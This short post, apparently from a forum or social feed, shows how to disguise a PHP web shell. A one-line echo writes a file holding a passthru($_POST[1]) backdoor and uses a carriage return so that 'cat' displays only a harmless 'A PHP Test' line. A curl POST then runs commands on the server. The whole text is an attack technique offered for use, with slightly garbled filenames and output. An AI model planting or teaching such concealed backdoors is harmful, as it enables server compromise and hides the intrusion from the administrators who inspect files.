Disguising a PHP Micro Webshell 

`echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > test.php` 

url : http://t.co/YFm6QlpK0k

vist browser  page show `A PHP Test`

then in console use `cat xxx.php`
it show `<?php echo 'A PHP Test ';" ?>`

then in console run
`curl -d 1=id http://www.xxx.xx/xx.php`

it like in console show command `id`  
